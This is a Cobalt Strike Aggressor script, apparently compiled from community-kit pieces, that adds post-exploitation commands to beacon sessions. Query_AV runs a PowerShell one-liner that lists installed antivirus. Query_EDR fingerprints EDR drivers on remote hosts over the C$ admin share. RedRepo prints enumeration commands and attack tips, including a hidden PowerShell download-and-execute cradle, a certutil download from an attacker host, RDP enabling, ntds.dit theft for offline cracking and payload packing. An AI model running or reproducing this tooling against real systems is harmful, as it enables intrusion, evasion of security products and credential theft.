#Borrowed from several scripts from the Cobalt Strike Community Kit
# Keyboard shortcuts
# Next tab and previous tab
bind Meta+Right {
    nextTab();
}

bind Meta+Left {
    previousTab();
}

bind Ctrl+Tab {
    nextTab();
}

bind Shift+Ctrl+Tab {
    previousTab();
}

# Open the Script Console
bind Shift+Ctrl+S {
    openScriptConsole();
}

# Open the connect dialog
bind Ctrl+N {
    openConnectDialog();
}

# Load scripts
#include(script_resource("powershell.cna"));
#include(script_resource("ElevateKit/elevate.cna"));

# Change default event log
set EVENT_SBAR_RIGHT {
    # Add number of beacons to event log status bar
    $beacons = size(beacons());
    return "[\c9Beacons: $beacons\o | lag: $1 $+ ]";
}

# on beacon_initial {
#     if (-isadmin $1) {
#         exec("say -v Fiona 'New admin beacon!'");
#     }
#}

#AV SEARCHER
#Long ass one-liner :)
$powershellcmd = "\$av_list = @(\"BitDefender\", \"Kaspersky\", \"McAfee\", \"Norton\", \"Avast\", \"WebRoot\", \"AVG\", \"ESET\", \"Malware\", \"Windows Defender\");\$av_install = Get-ItemProperty HKLM:\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*;\$av_install1 = Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*;\$regkey = 'HKLM:\\SOFTWARE\\Microsoft\\Windows Defender\\Signature Updates\\';\$av_loop2 = foreach (\$av1 in \$av_list){foreach (\$key in \$av_install){if (\$key.DisplayName -match \$av1 -eq \$TRUE){% {\"{0}|{1}|{2}\" -f \$key.DisplayName.ToString(), \$key.DisplayVersion.ToString(), \$key.InstallDate.ToString()}}}};\$proc_temp = Get-Process;\$av_loop = foreach (\$av in \$av_list){foreach (\$zz in \$proc_temp){if (\$zz.path -match \$av -eq \$TRUE){% {\"{0}|{1}|{2}\" -f \$zz.Id.ToString(), \$zz.Name.Split('\"')[0],  \$zz.Path.ToString()}}}};\$av_loop3 = foreach (\$av2 in \$av_list){foreach (\$key1 in \$av_install1){if (\$key1.DisplayName -match \$av2 -eq \$TRUE){% {\"{0}|{1}|{2}\" -f \$key1.DisplayName.ToString(), \$key1.DisplayVersion.ToString(), \$key1.InstallDate.ToString()}}}};Write-Output \"`nPID|Name|Path`n\";Write-Output \$av_loop;Write-Output \"`nWindows Defender AV Signature Version:\";(Get-ItemProperty -Path \$regkey).ASSignatureVersion;Write-Output \"`nAV Name|Version|Install Date`n\";Write-Output \$av_loop2;Write-Output \$av_loop3";

#AV_Query Command Register
beacon_command_register("Query_AV", "Queries the Registry for AV Installed (uses Powershell and WMI)",
	"Syntax: Query_AV\n" .
	"Checks HKLM hive for All AntiVirus installed");

#AV_Query alias
alias Query_AV {
	
	blog($1, "\cBDetermining what AntiVirus is installed...");
	bpowerpick!($1, $powershellcmd);
	bpause($1, int(30000));
	bpowerpick!($1, "Get-WmiObject -Namespace \"root\\SecurityCenter2\" -Query \"SELECT * FROM AntiVirusProduct\" | select-object displayName,pathToSignedReportingExe,timestamp| fl");
		
}


#EDR.cna
#Author: @r3dqu1nn
#Remotely query a system for EDR products

@edr = @("CiscoAMPCEFWDriver.sys", "CiscoAMPHeurDriver.sys", "cbstream.sys", "cbk7.sys", "Parity.sys", "libwamf.sys", "LRAgentMF.sys", "BrCow_x_x_x_x.sys", "brfilter.sys", "BDSandBox.sys", "TRUFOS.SYS", "AVC3.SYS", "Atc.sys", "AVCKF.SYS", "bddevflt.sys", "gzflt.sys", "bdsvm.sys", "hbflt.sys", "cve.sys", "psepfilter.sys", "cposfw.sys", "dsfa.sys", "medlpflt.sys", "epregflt.sys", "TmFileEncDmk.sys", "tmevtmgr.sys", "TmEsFlt.sys", "fileflt.sys", "SakMFile.sys", "SakFile.sys", "AcDriver.sys", "TMUMH.sys", "hfileflt.sys", "TMUMS.sys", "MfeEEFF.sys", "mfprom.sys", "hdlpflt.sys", "swin.sys", "mfehidk.sys", "mfencoas.sys", "epdrv.sys", "carbonblackk.sys", "csacentr.sys", "csaenh.sys", "csareg.sys", "csascr.sys", "csaav.sys", "csaam.sys", "esensor.sys", "fsgk.sys", "fsatp.sys", "fshs.sys", "eaw.sys", "im.sys", "csagent.sys", "rvsavd.sys", "dgdmk.sys", "atrsdfw.sys", "mbamwatchdog.sys", "edevmon.sys", "SentinelMonitor.sys", "edrsensor.sys", "ehdrv.sys", "HexisFSMonitor.sys", "CyOptics.sys", "CarbonBlackK.sys", "CyProtectDrv32.sys", "CyProtectDrv64.sys", "CRExecPrev.sys", "ssfmonm.sys", "CybKernelTracker.sys", "SAVOnAccess.sys", "savonaccess.sys", "sld.sys", "aswSP.sys", "FeKern.sys", "klifks.sys", "klifaa.sys", "Klifsm.sys", "mfeaskm.sys", "mfencfilter.sys", "WFP_MRT.sys", "groundling32.sys", "SAFE-Agent.sys", "groundling64.sys", "avgtpx86.sys", "avgtpx64.sys", "pgpwdefs.sys", "GEProtection.sys", "diflt.sys", "sysMon.sys", "ssrfsf.sys", "emxdrv2.sys", "reghook.sys", "spbbcdrv.sys", "bhdrvx86.sys", "bhdrvx64.sys", "SISIPSFileFilter.sys", "symevent.sys", "VirtualAgent.sys", "vxfsrep.sys", "VirtFile.sys", "SymAFR.sys", "symefasi.sys", "symefa.sys", "symefa64.sys", "SymHsm.sys", "evmf.sys", "GEFCMP.sys", "VFSEnc.sys", "pgpfs.sys", "fencry.sys", "symrg.sys", "cfrmd.sys", "cmdccav.sys", "cmdguard.sys", "CmdMnEfs.sys", "MyDLPMF.sys", "PSINPROC.SYS", "PSINFILE.SYS", "amfsm.sys", "amm8660.sys", "amm6460.sys");

#edr_query Command Register
beacon_command_register("Query_EDR", "Queries the remote or local system for all major EDR products installed",
    "Syntax: Query_EDR [hostname] [arch]\n" .
    "Checks the local or remote system for installed EDR products. **Note: Use localhost for [hostname] to query the local system**");

#edr_query alias
alias Query_EDR {
	$bid = $1;
    if ($2 is $null) {
		blog($bid, "\c4Please enter a remote hostname or localhost!");
		show_message("Please enter a remote hostname or localhost!");
	}
	else if ($3 is $null) {
		blog($bid, "\c4Please enter a valid architechture!");
		show_message("Please enter a valid architechture!");
	}
    else if ($3 ismatch 'x64') {
        blog($bid, "\cBDetermining what EDR products are installed on ". $2 ."...");
        bls($bid, "\\\\". $2 ."\\C\$\\windows\\system32\\drivers", &list);
    }
    else if ($3 ismatch 'x86') {
        blog($bid, "\cBDetermining what EDR products are installed on ". $2 ."...");
        bls($bid, "\\\\". $2 ."\\C\$\\windows\\sysnative\\drivers", &list);
    }
}

sub query {
	
	$bid = $1;
	$dialog = dialog("EDR Query Menu", %(hostname => "localhost", Arch => ""), &EDR);
	dialog_description($dialog, "EDR Query Menu. Remotely query a system for EDR products. Hostname field (IP or Hostname) is Mandatory! **Note: Use localhost for the local system.**");
	drow_text($dialog, "hostname", "Target HostName:");
	drow_combobox($dialog, "Arch", "Target Architechture:", @("x64", "x86"));
	dbutton_action($dialog, "Execute");
	dialog_show($dialog);

}

sub EDR {

	if ($3['hostname'] ismatch 'Enter Remote HostName') {
		show_message("Please enter a remote hostname or localhost!");
		blog($bid, "\c4Please enter a remote hostname or localhost!");
	}
	else if ($3['Arch'] ismatch 'x86') {
		bls($bid, "\\\\". $3['hostname'] ."\\C\$\\windows\\sysnative\\drivers", &list);
		blog($bid, "\cBDetermining what EDR products are installed on ". $3['hostname']. "...");
	}
	else if ($3['Arch'] ismatch 'x64') {
		bls($bid, "\\\\". $3['hostname'] ."\\C\$\\windows\\system32\\drivers", &list);
		blog($bid, "\cBDetermining what EDR products are installed on ". $3['hostname']. "...");
	}

}

#Parse dem results
sub list {

    local('$entry $type $size $modified $name $out');
    @results = split("\n", ["$3" trim]);
    @matches = @();
    foreach $entry (@results) {
    ($type, $size, $modified, $name) = split("\t", $entry);
        if ($name in @edr) {
            blog($bid, "\cB$name Found");
            add(@matches, $name, 0);
        }
    }
    $size = size(@matches);
    $out .= "\c4$size EDR Products Found!\n";
    $out .= "    \c0======================\n";
    $out .= "    | Vendor Information | \n";
    $out .= "\c0    ----------------------";
    if (size(@matches) == 0) {
        blog($bid, "\c9No EDR products found! Operate at your own risk!");
        clear(@matches);
    }
    if (size(@matches) > 0) {
        blog($bid, $out);
    }
    if ('FeKern.sys' in @matches || 'WFP_MRT.sys' in @matches) {
        blog($bid, "FireEye Found!");
    }
    if ('eaw.sys' in @matches) {
        blog($bid, "Raytheon Cyber Solutions Found!");
    }
    if ('rvsavd.sys' in @matches) {
        blog($bid, "CJSC Returnil Software Found!");
    }
    if ('dgdmk.sys' in @matches) {
        blog($bid, "Verdasys Inc. Found!");
    }
    if ('atrsdfw.sys' in @matches) {
        blog($bid, "Altiris (Symantec) Found!");
    }
    if ('mbamwatchdog.sys' in @matches) {
        blog($bid, "Malwarebytes Found!");
    }
    if ('edevmon.sys' in @matches || 'ehdrv.sys' in @matches) {
        blog($bid, "ESET Found!");
    }
    if ('SentinelMonitor.sys' in @matches) {
        blog($bid, "SentinelOne Found!");
    }
    if ('edrsensor.sys' in @matches || 'hbflt.sys' in @matches || 'bdsvm.sys' in @matches || 'gzflt.sys' in @matches || 'bddevflt.sys' in @matches || 'AVCKF.SYS' in @matches || 'Atc.sys' in @matches || 'AVC3.SYS' in @matches || 'TRUFOS.SYS' in @matches || 'BDSandBox.sys' in @matches) {
        blog($bid, "BitDefender Found!");
    }
    if ('HexisFSMonitor.sys' in @matches) {
        blog($bid, "Hexis Cyber Solutions Found!");
    }
    if ('CyOptics.sys' in @matches || 'CyProtectDrv32.sys' in @matches || 'CyProtectDrv64.sys' in @matches) {
        blog($bid, "Cylance Inc. Found!");
    }
    if ('aswSP.sys' in @matches) {
        blog($bid, "Avast Found!");
    }
    if ('mfeaskm.sys' in @matches || 'mfencfilter.sys' in @matches || 'epdrv.sys' in @matches || 'mfencoas.sys' in @matches || 'mfehidk.sys' in @matches || 'swin.sys' in @matches || 'hdlpflt.sys' in @matches || 'mfprom.sys' in @matches || 'MfeEEFF.sys' in @matches) {
        blog($bid, "McAfee Found!");
    }
    if ('groundling32.sys' in @matches || 'groundling64.sys' in @matches) {
        blog($bid, "Dell Secureworks Found!");
    }
    if ('avgtpx86.sys' in @matches || 'avgtpx64.sys' in @matches) {
        blog($bid, "AVG Technologies Found!");
    }
    if ('pgpwdefs.sys' in @matches || 'GEProtection.sys' in @matches || 'diflt.sys' in @matches || 'sysMon.sys' in @matches || 'ssrfsf.sys' in @matches || 'emxdrv2.sys' in @matches || 'reghook.sys' in @matches || 'spbbcdrv.sys' in @matches || 'bhdrvx86.sys' in @matches || 'bhdrvx64.sys' in @matches || 'SISIPSFileFilter.sys' in @matches || 'symevent.sys' in @matches || 'vxfsrep.sys' in @matches || 'VirtFile.sys' in @matches || 'SymAFR.sys' in @matches || 'symefasi.sys' in @matches || 'symefa.sys' in @matches || 'symefa64.sys' in @matches || 'SymHsm.sys' in @matches || 'evmf.sys' in @matches || 'GEFCMP.sys' in @matches || 'VFSEnc.sys' in @matches || 'pgpfs.sys' in @matches || 'fencry.sys' in @matches || 'symrg.sys' in @matches) {
        blog($bid, "Symantec Found!");
    }               
    if ('SAFE-Agent.sys' in @matches) {
        blog($bid, "SAFE-Cyberdefense Found!");
    }
    if ('CybKernelTracker.sys' in @matches) {
        blog($bid, "CyberArk Software Found!");
    }
    if ('klifks.sys' in @matches || 'klifaa.sys' in @matches || 'Klifsm.sys' in @matches) {
        blog($bid, "Kaspersky Found!");
    }
    if ('SAVOnAccess.sys' in @matches || 'savonaccess.sys' in @matches || 'sld.sys' in @matches) {
        blog($bid, "Sophos Found!");
    }
    if ('ssfmonm.sys' in @matches) {
        blog($bid, "Webroot Software, Inc. Found!");
    }
    if ('CarbonBlackK.sys' in @matches || 'carbonblackk.sys' in @matches || "Parity.sys" in @matches || "cbk7.sys" in @matches || "cbstream.sys" in @matches) {
        blog($bid, "Carbon Black Found!");
    }
    if ('CRExecPrev.sys' in @matches) {
        blog($bid, "Cybereason Found!");
    }
    if ('im.sys' in @matches || 'CSAgent.sys' in @matches || 'CSBoot.sys' in @matches || 'CSDeviceControl.sys' in @matches || 'cspcm2.sys' in @matches) {
        blog($bid, "CrowdStrike Found!");
    }
    if ('cfrmd.sys' in @matches || 'cmdccav.sys' in @matches || 'cmdguard.sys' in @matches || 'CmdMnEfs.sys' in @matches || 'MyDLPMF.sys' in @matches) {
        blog($bid, "Comodo Security Solutions Found!");
    }
    if ('PSINPROC.SYS' in @matches || 'PSINFILE.SYS' in @matches || 'amfsm.sys' in @matches || 'amm8660.sys' in @matches || 'amm6460.sys' in @matches) {
        blog($bid, "Panda Security Found!");
    }
    if ('fsgk.sys' in @matches || 'fsatp.sys' in @matches || 'fshs.sys' in @matches) {
        blog($bid, "F-Secure Found!");
    }
    if ('esensor.sys' in @matches) {
        blog($bid, "Endgame Found!");
    }
    if ('csacentr.sys' in @matches || 'csaenh.sys' in @matches || 'csareg.sys' in @matches || 'csascr.sys' in @matches || 'csaav.sys' in @matches || 'csaam.sys' in @matches) {
        blog($bid, "Cisco Found!");
    }
    if ('TMUMS.sys' in @matches || 'hfileflt.sys' in @matches || 'TMUMH.sys' in @matches || 'AcDriver.sys' in @matches || 'SakFile.sys' in @matches || 'SakMFile.sys' in @matches || 'fileflt.sys' in @matches || 'TmEsFlt.sys' in @matches || 'tmevtmgr.sys' in @matches || 'TmFileEncDmk.sys' in @matches) {
        blog($bid, "Trend Micro Inc Found!");
    }
    if ('epregflt.sys' in @matches || 'medlpflt.sys' in @matches || 'dsfa.sys' in @matches || 'cposfw.sys' in @matches) {
        blog($bid, "Check Point Software Technologies Found!");
    }
    if ('psepfilter.sys' in @matches || 'cve.sys' in @matches) {
        blog($bid, "Absolute Found!");
    }
    if ('brfilter.sys' in @matches || 'BrCow_x_x_x_x.sys' in @matches) {
        blog($bid, "Bromium Found!");
    }
    if ('LRAgentMF.sys' in @matches) {
        blog($bid, "LogRhythm Found!");
    }
    if ('libwamf.sys' in @matches) {
        blog($bid, "OPSWAT Inc Found!");
    }
}

popup beacon_bottom {
	item "EDR Query" {
		query($1);
	}
}



#Red REPO
beacon_command_register("RedRepo", "A large repository of commands and red team tips",
	"\nSyntax: RedRepo [Option]\n" .
	"\nList Options: RedRepo [List]\n" .
	"\nDisplays well known commands for an OS, or diplays great tips or tricks for a Red Team Operator.\n");

alias RedRepo {

	if ($2 ismatch 'List') {
		local('$out');
		#blog($1, "\c0\n\nRepo Options\n============");
		$out = "RedRepo Options\n";
		$out .= "    \c0===============\n\n";
		$out .= "    Option                   Description\n";
		$out .= "\c0    ------                   -----------\n";
		blog($1, $out);
		blog2($1, "\cBWindows                  Windows Enumeration Commands");
		blog2($1, "\cBLinux                    Linux Enumeration Commands");
		blog2($1, "\cBTips                     Red Team Tips");
		blog2($1, "\cBList                     List of Options");
		blog2($1, "\cBSmile                    Happy Hacking!\n");

	}

	if ($2 ismatch 'Windows') {

		blog($1, "\t\c4====== Common Windows Commands ======\n");

		#WMIC Commands
		blog($1, "\t\c4====== WMIC Enumeration Commands ======\n");

		blog2($1, "\t\cBwmic computersystem get Name,domain,NumberofProcessors,Roles,totalphysicalmemory");
		blog2($1, "\t\cBwmic desktop get Name,ScreenSaverActive,Wallpaper");
		blog2($1, "\t\cBwmic netlogin get Caption,Privileges,UserID,UserType,NumberOfLogons,PasswordAge,LogonServer,Workstations");
		blog2($1, "\t\cBwmic process get CSName,Description,ExecutablePath,ProcessId");
		blog2($1, "\t\cBwmic service get Caption,Name,PathName,ServiceType,Started,StartMode,StartName");
		blog2($1, "\t\cBwmic volume get Label,DeviceID,DriveLetter,FileSystem,Capacity,FreeSpace");
		blog2($1, "\t\cBwmic netuse list full");
		blog2($1, "\t\cBwmic startup get Caption,Command,Location,User");
		blog2($1, "\t\cBwmic PRODUCT get Description,InstallDate,InstallLocation,PackageCache,Vendor,Version");
		blog2($1, "\t\cBwmic qfe get HotFixID,InstalledOn");
		blog2($1, "\t\cBwmic ntdomain list");
		blog2($1, "\t\cBwmic bios [list full]\n");

		blog($1, "\t\c4====== Info Harvesting ======\n");
		#Host Enumeration
		blog2($1, "\t\cBsysteminfo");
		blog2($1, "\t\cBsysteminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\"");
		blog2($1, "\t\cBSET");
		blog2($1, "\t\cBipconfig /all");
		blog2($1, "\t\cBroute print");
		blog2($1, "\t\cBarp -a");
		blog2($1, "\t\cBnetstat -ano | findstr /I listening");
		blog2($1, "\t\cBnetstat -ano | findstr /I established");
		blog2($1, "\t\cBnbtstat -A *target IP*");
		blog2($1, "\t\cBnslookup");
		blog2($1, "\t\cBreg query [key]");
		blog2($1, "\t\cBGet-ItemProperty [key] (PowerShell)");
		blog2($1, "\t\cBschtasks /query /fo LIST /v");
		blog2($1, "\t\cBsc query");
		blog2($1, "\t\cBsc qc [service name]");
		blog2($1, "\t\cBtasklist /SVC (/S Remote Computer)");
		blog2($1, "\t\cBDRIVERQUERY");
		blog2($1, "\t\cBRun C:\\Windows\\System32\\gatherNetworkInfo.vbs script and check results inside C:\\Windows\\System32\\Config");
		blog2($1, "\t\cBgpresult /z");
		blog2($1, "\t\cBwhoami /all");
		blog2($1, "\t\cBnetsh firewall show conf");
		blog2($1, "\t\cBnetsh wlan show profiles");
		blog2($1, "\t\cBnetsh advfirewall show allprofiles\n");

		blog($1, "\t\c4======= Net Commands =======\n");
		#Old School Net Commands
		blog2($1, "\t\cBnet accounts [/domain]");
		blog2($1, "\t\cBnet group \"groupname\" [/domain]");
		blog2($1, "\t\cBnet localgroup \"groupname\" [/domain]");
		blog2($1, "\t\cBnet view [/domain]");
		blog2($1, "\t\cBnet session");
		blog2($1, "\t\cBnet share");
		blog2($1, "\t\cBnet user [/domain]");
		blog2($1, "\t\cBnet user [username] [/domain]");
		blog2($1, "\t\cBnet use * \\\\IP\\C$ /user:username [password]");
		blog2($1, "\t\cBUse the built in net commands with Beacon! [help net]\n");

	}

	if ($2 ismatch 'Linux') {

		blog($1, "\t\c4====== Common Linux Commands ======\n");

		blog($1, "\t\c4====== Info Harvesting/Host/Network Enumeration ======\n")

		blog2($1, "\t\cBcat /etc/issue");
		blog2($1, "\t\cBcat /etc/*-release");
		blog2($1, "\t\cBcat /etc/*-release | grep -E '\"NAME=\"|ID|VERSION|ID_LIKE'");
		blog2($1, "\t\cBcat /proc/version");
		blog2($1, "\t\cBrpm -q kernel");
		blog2($1, "\t\cBdmesg | grep Linux");
		blog2($1, "\t\cBls /boot | grep vmlinuz-");
		blog2($1, "\t\cBlsb_release -a");
		blog2($1, "\t\cBlast -a");
  		blog2($1, "\t\cBuname -a");
  		blog2($1, "\t\cBuname -mrs");
  		blog2($1, "\t\cBid");
		blog2($1, "\t\cBhistory");
		blog2($1, "\t\cBarp -a");
		blog2($1, "\t\cBnetstat -anot");
		blog2($1, "\t\cBps -elf");
		blog2($1, "\t\cBps -elf | grep root");
		blog2($1, "\t\cBls -la /var/www/html/");
		blog2($1, "\t\cBservice apache2 status");
		blog2($1, "\t\cBcat /etc/resolv.conf");
		blog2($1, "\t\cBcat /etc/networks");
		blog2($1, "\t\cBiptables -L");
		blog2($1, "\t\cBiptables -L -t nat");
		blog2($1, "\t\cBlsof -i");
		blog2($1, "\t\cBcat /etc/services");
		blog2($1, "\t\cBgrep 80 /etc/services");
		blog2($1, "\t\cBw");
		blog2($1, "\t\cBroute -n");
		blog2($1, "\t\cBcat /etc/passwd");
		blog2($1, "\t\cBcat /etc/passwd | awk -F : '{if (\$3 > 999 && \$3 < 60001) print \$1,\$3,\$6}'");
		blog2($1, "\t\cBcat /etc/motd");
		blog2($1, "\t\cBcat /etc/group");
		blog2($1, "\t\cBcat /etc/shadow\n");


	}

	if ($2 ismatch 'Tips') {

		blog($1, "\t\c4====== Red Team Tips ======\n");
		#Red Tips
		blog2($1, "\t\cBhttps://github.com/vysec/RedTips (If you have InterWebs)");
		blog2($1, "\t\cBhttps://github.com/subTee/ApplicationWhitelistBypassTechniques/blob/master/TheList.txt (InterWebs Required)");
		blog2($1, "\t\cBNeed a map of the network? Run Bloodhound!! https://github.com/BloodHoundAD/BloodHound");
		blog2($1, "\t\cBAlways check sysvols!! Domain Controllers will have them, you'll be surprised how some are still viewable by normal users.");
		blog2($1, "\t\cBnet user a specific user and see if they are executing any logon scripts, those might contain juicy information.");
		blog2($1, "\t\cBAlways check Desktops/Documents/Downloads/Favorites folders for trails of valuable information left behind.");
		blog2($1, "\t\cBFind those Fileservers! Sysadmins leave behind all kinds of goodies there.");
		blog2($1, "\t\cBUse a Windows 7 workstation to tunnel your traffic natively. netsh int portproxy v4tov4 listenport=[port] connecthost=[AttackerIP] connectport=[port]");
		blog2($1, "\t\cBUse certutil.exe -urlcache -split -f [http://AttackerIP/RemoteFile] to download a file to the target machine.");
		blog2($1, "\t\cBThe all powerful one-liner powershell.exe -w hidden -nop -ep bypass -c \"IEX ((new-object net.webclient).downloadstring('http://[domainname|IP]:[port]/[file]'))\"");
		blog2($1, "\t\cBUse tasklist /S [RemoteComputer] /SVC to see if you have access to that remote machine.");
		blog2($1, "\t\cBEnable RDP through the registry: reg add “HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server” /v fDenyTSConnections /t REG_DWORD /d 0 /f");
		blog2($1, "\t\cBPlease wrap/encode/pack your payloads if you have to drop to disk!");
		blog2($1, "\t\cBTry to stay in memory and avoid putting files on disk.");
		blog2($1, "\t\cBLive off the land!! Use what is on the target, native windows binaries are very powerful!");
		blog2($1, "\t\cBUse AD naming schemes to your advantage, sysadmins are lazy and use organization to help them with all the IT work they do on a daily basis.");
		blog2($1, "\t\cBEnterprise Admins will almost always have the rights to move laterally to those foreign domain controllers, 9 times out of 10 they use the same password!");
		blog2($1, "\t\cBInvoke-NinjaCopy.ps1 is super powerful and should be used to grab the ntds.dit and SYSTEM files for offline cracking.");
		blog2($1, "\t\cBHave multiple points of presence on a network for longer engagements. Persistence can go a long way for Security Operations.");
		blog2($1, "\t\cBcmd.exe and powershell.exe blocked by GPO? Find a process that's user owned and started on bootup for process injection to bypass that.");
		blog2($1, "\t\cBJust because you acquired initial access doesn't mean you stop doing recon. Network/Host Enumeration is always the most important part.");
		blog2($1, "\t\cBInvoke-ReverseDnsLookup.ps1 of powersploit finds those machines on the network that has DNS records and can provide more SA for an attacker.");
		blog2($1, "\t\cBNeed a Temporary web server? Use Python! python -m SimpleHTTPServer [port]\n");

	}

	if ($2 ismatch 'Smile') {
		local('$smile');
		$smile = "\n";
		$smile .= "\t\c9░░░░░░░░░░░███████░░░░░░░░░░░\n";
		$smile .= "\t\c9░░░░░░░████░░░░░░░████░░░░░░░\n";
		$smile .= "\t\c9░░░░░██░░░░░░░░░░░░░░░██░░░░░\n";
		$smile .= "\t\c9░░░██░░░░░░░░░░░░░░░░░░░██░░░\n";
		$smile .= "\t\c9░░█░░░░░░░░░░░░░░░░░░░░░░░█░░\n";
		$smile .= "\t\c9░█░░████░░░░░░░░██████░░░░░█░\n";
		$smile .= "\t\c9█░░█░░░██░░░░░░█░░░░███░░░░░█\n";
		$smile .= "\t\c9█░█░░░░░░█░░░░░█░░░░░░░█░░░░█\n";
		$smile .= "\t\c9█░█████████░░░░█████████░░░░█\n";
		$smile .= "\t\c9█░░░░░░░░░░░░░░░░░░░░░░░░░░░█\n";
		$smile .= "\t\c9█░░░░░░░░░░░░░░░░░░░░░░░░░░░█\n";
		$smile .= "\t\c9█░░░████████████████████░░░░█\n";
		$smile .= "\t\c9░█░░░█▓▓▓▓▓▓▓▓█████▓▓▓█░░░░█░\n";
		$smile .= "\t\c9░█░░░░█▓▓▓▓▓██░░░░██▓██░░░░█░\n";
		$smile .= "\t\c9░░█░░░░██▓▓█░░░░░░░▒██░░░░█░░\n";
		$smile .= "\t\c9░░░██░░░░██░░░░░░▒██░░░░██░░░\n";
		$smile .= "\t\c9░░░░░██░░░░███████░░░░██░░░░░\n";
		$smile .= "\t\c9░░░░░░░███░░░░░░░░░███░░░░░░░\n";
		$smile .= "\t\c9░░░░░░░░░░█████████░░░░░░░░░░\n";
		blog($1, $smile);
	}

	if ($2 is $null) {
		berror($1, "\c4Need to specify additional syntax! Use the 'List' command for help");
		blog($1, "\cBSyntax Example: RedRepo Windows");
	}

}
